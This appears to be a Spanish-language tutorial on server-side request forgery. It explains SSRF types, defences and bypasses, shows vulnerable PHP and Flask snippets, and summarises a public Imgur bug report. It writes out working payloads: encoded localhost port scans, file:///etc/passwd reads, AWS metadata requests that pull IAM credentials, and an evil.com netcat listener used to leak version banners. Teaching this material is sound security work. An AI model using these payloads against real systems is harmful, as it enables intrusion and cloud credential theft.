![Ataque](https://user-images.githubusercontent.com/88755387/131371160-5ef55041-821f-4c89-b4d4-ac5c98b8f75d.png)

## __Summary__

- [__Introducción al SSRF__](#¿Cuándo-se-produce-un-SSRF?)
- [__Tipos__](#Tipos-de-SSRF)
  - [__Basic__](#Basic-SSRF)
  - [__Blind__](#Blind-SSRF)
- [__Protecciones__](#Protecciones)
  - [__Bypasses__](#Bypasses)
- [__Principales riesgos__](#Principales-riesgos)
- [__Causas de la vulnerabilidad__](#Causas-de-la-vulnerabilidad)
  - [__php__](#php)
  - [__python__](#python)
- [__SSRF Payloads__](#SSRF-Payloads)
  - [__Basic__](#Basic-Payloads)
  - [__Advanced__](#Advanced-Payloads)
  - [__Reading files__](#Reading-files)
- [__Funcionamiento__](#Cómo-funciona-realmente?)
- [__SSRF report__](#SSRF-Report)

# __¿Cuándo se produce un SSRF?__

Un Server Side Request Forgery ocurre cuando una aplicación web permite hacer consultas HTTP del lado del servidor hacia un dominio arbitrario elegido por el atacante. Esto le permite al atacante hacer conexión con servicios de la infraestructura interna donde se aloja la web y exfiltrar información sensible.

```
En términos más simples, SSRF es una vulnerabilidad en las aplicaciones web mediante la cual un atacante puede realizar más solicitudes HTTP a través del servidor. Un atacante puede hacer uso de esta vulnerabilidad para comunicarse con cualquier servicio interno en la red del servidor que generalmente está protegido por firewalls.
```

Ejemplos de esta vulnerabilidad son: 
- Explorar directorios privados del servidor
- Ejecución remota de código en el servidor de destino 
- Acceso a máquinas locales detrás del firewall de la red (escaneos de puertos)

Un tipo de acción no autorizada que merece especial atención es cuando el atacante se aprovecha del servidor vulnerable como un trampolín para permitir ataques compuestos más grandes, en particular combinaciones de SSRF y XXE.

Las vulnerabilidades de SSRF no se limitan unicamente al acceso web. Un atacante medianamente avispado podría falsificar `non-web payloads` que involucren protocolos como ftp, smtp y smb.

# __Tipos de SSRF__

Según cómo responde el servidor de la víctima a la solicitud, se puede dividir en dos tipos. 

## __Basic SSRF__

Este es el tipo de SSRF en el que el servidor de la víctima devuelve datos al atacante. Este tipo aparece cuando el pirata informático desea obtener datos del servidor o desea acceder a funciones no autorizadas.

Dentro del básico tenemos dos tipos:

- Full Response: Nos permite ver la respuesta completa del servidor.
- Limited or No Response: Muestra una parte de la respuesta, como el título de la página o `No Response`, o tiene acceso a los recursos pero no podemos verlos directamente. 

## __Blind SSRF__

Como su nombre indica, en este tipo de SSRF, los atacantes no obtienen datos del servidor. Esto se ve comúnmente cuando la solicitud es solo para activar alguna acción en el servidor de la víctima sin devolver nada al servidor solicitante. 

# __Protecciones__

- Whitelisting: Solo permite que se utilicen algunos `domain names` en la solicitud.
- Blacklisting: Bloquear el acceso a direcciones IP internas, dominios o palabras clave.
- Restricted Content-Type, extensions or characters: Solo permitir un tipo de archivo en particular.
- No Response: Es posible que no podamos ver la respuesta de la solicitud.

## __Bypasses__

- Whitelisting: Encontrando un `open redirect`.
- Blacklisting: - Blacklisting: Creando un CNAME personalizado y apuntándolo a nuestra dirección IP interna en nuestro objetivo.
- Restricted Content-Type, extensions or characters: Fuzzing manual y creación de un bypass.
- No Response: Solicitud de `Javascript XHR` para recuperar el contenido del archivo.

# __Principales riesgos__

Un atacante podría realizar consultas a servicios internos de la empresa para:

- Robar datos sensibles como credenciales de usuarios o archivos de sistema.
- Hacer peticiones a servicios internos para manejar el panel de administración, escanear puertos y servicios dentro de la infraestructura interna y conectarse al servidor de correos para enviar correos sin autorización.
- Escalar privilegios dentro del sistema y ejecutar código de forma remota dentro del servidor.

# __Causas de la vulnerabilidad__

La principal causa de la vulnerabilidad es confiar ciegamente en la entrada de un usuario. En el caso de una vulnerabilidad SSRF, se le pedirá al usuario que ingrese una URL, o tal vez una dirección IP el cual la aplicación web lo usaría para realizar una solicitud. SSRF se produce cuando la entrada no se ha verificado o filtrado correctamente.

Veamos varios códigos vulnerables.

## __php__

Supongamos que hay una aplicación que toma la URL de una imagen, que luego muestra la página web. El código SSRF vulnerable se vería así:

```php
<?php

if (isset($_GET['url']))

{
  $url = $_GET['url'];
  $image = fopen($url, 'rb');
  header("Content-Type: image/png");
  fpassthru($image);
}
>
```

Este es un código PHP simple que verifica si hay información enviada en un parámetro 'url' y luego, sin realizar ningún tipo de verificación, el código simplemente realiza una solicitud a la URL enviada por el usuario. Los atacantes esencialmente tienen el control total de la URL y pueden realizar solicitudes GET arbitrarias a cualquier sitio web en Internet a través del servidor, además de acceder a los recursos en el propio servidor.

## __python__

```python
from flask import Flask, request, render_template, redirect
import requests

app = Flask(__name__)

@app.route("/")
def start():
    url = request.arg.get("id")
    r = requests.head(url, timeout=2.000)
    return render_template("index.html", result = r.content)

if __name__ = "__main__":
      app.run(host = '0.0.0.0')
```

El ejemplo anterior muestra una aplicación de flask muy pequeña que hace lo mismo:

1) Toma el valor del parámetro `url`.
2) Luego, realiza una solicitud a la URL dada y muestra el contenido de esa URL al usuario.

Nuevamente vemos que no hay existe una sanitización ni ningún tipo de verificación realizada en la entrada del usuario. Es por eso que siempre debemos probar tantos payloads diferentes como podamos al probar una aplicación.

# __SSRF Payloads__

## __Basic Payloads__

Inicialmente, comencemos buscando la IP del host local con cualquier puerto para ver si el puerto está ejecutando un servicio. Supongamos que desea verificar si el servidor tiene una base de datos oculta, podemos buscar http://127.0.0.1:3306 (3306 es el puerto para MySQL DB) por lo que si hay una base de datos en ejecución, es probable que obtengamos una respuesta positiva.

![basic ssrf](https://user-images.githubusercontent.com/88755387/132110504-72fb6d2e-3efb-479a-87cb-d8d5c2467516.png)

Esto muestra que el puerto 3306 está abierto!

## __Advanced Payloads__

Ahora es muy posible que se aplique algún tipo de sanitización a la entrada, por lo que el sistema podría detectar cadenas como "localhost" o "127.0.0.1" y detener la solicitud.

La primera forma es probar la versión IPv6 del localhost i.e. [::]. Por lo tanto el payload se vería así `http://[::]:3306`.

También podríamos introducir el siguiente payload: `http://:::3306` el cual va a funcionar.

![ssrf](https://user-images.githubusercontent.com/88755387/132111975-6fc2e715-3045-41c8-b772-d6b26f36ee1e.png)

Es posible que también se detecte la carga útil de IPv6. En ese caso lo que solemos hacer es codificar nuestra IP: ya sea en formato decimal o en formato hexadecimal.

La IP `127.0.0.1` se puede reemplazar con sus formatos decimal y hexadecimal para evitar las restricciones. La versión decimal de la IP del localhost sería `2130706433` y la versión hexadecimal sería `0x7f000001`.

## __Reading files__

El escaneo de puertos no es lo único que podemos hacer con SSRF, también podemos leer archivos del servidor pero solo si usamos el esquema adecuado (es decir, para una solicitud HTTP, comenzaríamos la URL con `http://` de manera similar si comenzamos la URL con `file://` intentaría leer los archivos desde el propio servidor.

Entonces, por ejemplo, un payload de lectura de un archivo SSRF simple sería `file:///etc/passwd`, para leer el archivo `/etc/passwd` en una máquina Linux.

![file etc](https://user-images.githubusercontent.com/88755387/132110787-9f64e092-b044-4d11-9030-d55b3aebbb9c.png)

Recordemos que es poco probable que podamos leer archivos de un usuario con mayores privilegios, como `root`.

Existen muchos otros tipos de payloads que se pueden usar (como codificación de URL, codificación de URL doble, uso de esquemas como dict, etc.). Podemos ver algunos de estos payloads en el siguiente enlace: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#file.

# __Cómo funciona realmente?__

Cuando una aplicación hace una llamada a una URL (por ejemplo a una API), un atacante puede podría editar la consulta para que esa llamada se haga a otra dirección.

Vamos a ver cómo un atacante podría robar las llaves de AWS de una empresa.

## __Ejemplo__

Supongamos que una petición web que consulta el stock de un producto, se ve de la siguiente manera.

```
POST /stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded

stockApi=http://169.254.169.254/check/productId=1
```

En este caso, un atacante podría modificar la consulta para, en lugar de pedir datos de stock del producto, pedir los metadatos de la API y encontrar una lista de roles válidos.

```
POST /stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded

stockApi=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Aunque inicialmente la API tenga restricción de acceso para que no se puedan hacer consultas externas, la consulta se origina desde el servidor web. Por esto, la API va a responder a la consulta como si tuviera autorización para hacerla.

Una vez obtenida la lista de roles, el atacante podría usar un rol para hacer la siguiente petición.

```
POST /stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded

stockApi=http://169.254.169.254/latest/meta-data/iam/security-credentials/NOMBRE-ROL
```
De esta forma, el agente malicioso obtendría acceso a la llave AWS y podría tomar el control de todas las cuentas de AWS.

# __SSRF Report__

## __SSRF in https://imgur.com/vidgif/url__

Os dejo el reporte en el siguiente enlace por si le quereis echar un vistazo: https://hackerone.com/reports/115748

### __Explicacion del por qué de esta vuln__

La plataforma Imgur permite a los usuarios utilizar el servicio `video-to-gif`. Cuando un usuario solicita la conversión de dicho video, los servidores de imgur realizan una solicitud HTTP a una URL proporcionada por el usuario para descubrir el tipo de contenido y la longitud de la URL. Es evidente que para hacerlo Imgur utiliza `libcurl`. Sin embargo, esta no valida correctamente la entrada del usuario y no configura libcurl correctamente, lo que permite a un atacante utilizar varios envoltorios de protocolo libcurl distintos de http o https. Por ejemplo, un atacante puede proporcionar ftp://test.com/file como una URL y la plataforma realizará dicha solicitud de FTP.

### __¿Cuales son los protocolos explotables?__

Aparentemente, Imgur realiza conexiones a través de los siguientes protocolos:

- SSH (scp://, sftp://)
- POP3
- IMAP
- SMTP
- FTP
- DICT
- GOPHER
- TFTP

Varios filtran información sobre la infraestructura de imgur (SSH, DICT), otros permiten exploits más serios (TFTP, DICT, GOPHER).

### __Explotación simple - information disclosure via SSRF__

Imgur filtra información sobre las versiones de software instaladas a través de los protocolos SSH y DICT. Un atacante puede configurar un servidor `netcat` y obligar a los servidores Imgur a conectarse a él y filtrar información de la versión a través de una cadena de conexión, por ejemplo:

Request:  https://imgur.com/vidgif/url?url=sftp://evil.com:11111/

```
evil.com:$ nc -lvp 11111
Connection from [IP] port 443 [tcp/*] accepted (family 2, sport 36136)
SSH-2.0-libssh2_1.4.2
```

Request: https://imgur.com/vidgif/url?url=sftp://evil.com:11111/

```
evil.com:$ nc -lvp 11111
Listening on [0.0.0.0] (family 0, port 443)
Connection from [54.166.236.232] port 443 [tcp/*] accepted (family 2, sport 35789)
CLIENT libcurl 7.40.0

QUIT
```
De esta manera, un atacante puede descubrir versiones de software de imgur: libssh2 1.4.2 (probablemente vulnerable a CVE-2015-1782) y libcurl 7.40.0 (probablemente vulnerable a CVE-2015-3144, CVE-2015-3237). Todos son probables RCE.




